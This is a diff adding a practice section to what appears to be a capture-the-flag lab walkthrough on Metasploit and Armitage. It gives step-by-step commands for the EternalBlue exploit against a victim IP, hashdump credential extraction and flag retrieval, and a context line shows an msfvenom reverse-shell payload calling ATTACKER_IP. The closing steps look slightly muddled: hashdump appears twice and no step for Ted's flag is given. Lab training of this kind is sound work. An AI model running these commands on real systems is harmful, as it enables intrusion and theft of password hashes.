@@ -438,6 +438,64 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe
   > ![image](https://user-images.githubusercontent.com/51442719/180647730-46e02489-6ea5-4bbe-8a0a-fb05dd15d08f.png)
   > - *Compromised Host in Armitage*
 
+### Practice Time
+- Now that you have learned how to exploit hosts using Armitage, you will now get to practice your skills by hacking the virtual machine by using Metasploit and Armitage. 
+- There are multiple exploit paths that you may be able to follow. 
+- We encourage you to explore the various exploit paths you may be able to find in order to gain a better understanding of exploitation and post-exploitation modules in Metasploit and Armitage. 
+- As a reminder, Armitage is just Metasploit with a GUI; all the same exploits exist and are categorized the same way.
+
+<details>
+  <summary>
+
+# `Need Some Help? Click here!`
+
+  </summary>
+
+- If you are having difficulties with compromising the machine, here's a step-by-step guide to compromise the VM with Metasploit. 
+- If you would like to use Armitage, use this [`guide that shows step-by-step`](https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing) instructions. 
+- Now onto Metasploit!  
+
+#### Our first step is to launch Metasploit:
+```cmd
+msfconsole -q
+```
+```cmd
+use exploit/windows/smb/ms17_010_eternalblue
+```
+```cmd
+set LHOST eth0
+```
+```cmd
+set RHOST VICTIM_IP
+```
+```cmd
+run
+```
+
+- Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the users NTLM hashes:
+```cmd
+hashdump
+```
+- All that is left is to now retrieve the flags in the user's Home folders:
+```cmd
+cat C:/Users/Administrator/Desktop/root.txt
+```
+- And that's all there is to it! You have successfully compromised Ted's PC.
+```cmd
+hashdump
+```
+  
+</details>
+  
+### Answer the questions below
+- What flag can be found after gaining Administrative access to the PC?
+  > Answer format: [`***{********************************}`]()
+- What is the Administrator's NTLM hash?
+  > Answer format: [`********************************`]()
+- What flag can be found after gaining access to Ted's user account?
+  > Answer format: [`***{********************************}`]()
+- What is Ted's NTLM Hash?
+  > Answer format: [`********************************`]()
 
 
 ---
